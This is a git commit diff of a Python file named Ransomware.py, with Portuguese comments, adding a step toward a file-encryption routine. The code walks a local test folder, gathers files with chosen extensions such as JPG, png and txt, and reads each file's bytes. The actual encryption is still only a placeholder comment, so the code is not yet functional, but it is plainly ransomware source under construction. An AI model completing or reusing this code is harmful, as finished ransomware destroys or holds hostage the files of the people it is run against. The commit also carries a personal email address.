83b124bae8ebc9b3b899a4a9477390f6fe6f0be7
Vinicius Antônio Leite <josievinileite@gmail.com>
2021-11-03 17:35:13 -0300

    Criando a função de criptografia

--- Ransomware.py
+++ Ransomware.py
@@ -1,18 +1,25 @@
 import os
 import pyaes
+import glob
 
 arquivos_brutos = []
 pastas = []
-caminho = []
 lista_de_arquivo = []
 path_completo = []
 lista_de_extensoes = ["JPG", "png", "txt"]  #Adicionar as extensões que vão ser criptografadas
 
-def encrypt(caminho):
-    for cada_arquivo in caminho:
-        print(cada_arquivo)
+def encrypt(caminhos):
+    for caminho in caminhos:
+        print(caminho)
+        ##Lendo o conteúdo do ARQUIVO
+        with open(caminho, "rb") as arquivo:
+            arquivo_lido = arquivo.read()
+            print(arquivo_lido)
+        ##criptografar o arquivo
 
-for root, dirs, files in os.walk("C:\\Users\\vinicius\\Documents\\teste_ransomware"):
+
+#Buscando arquivos para criptografar
+for root, dirs, files in os.walk("C:\\Users\\vinicius\\Documents\\teste_ransomware\\demo"):
 
     arquivos_brutos.append(files)
     for arquivos_diversos in arquivos_brutos:
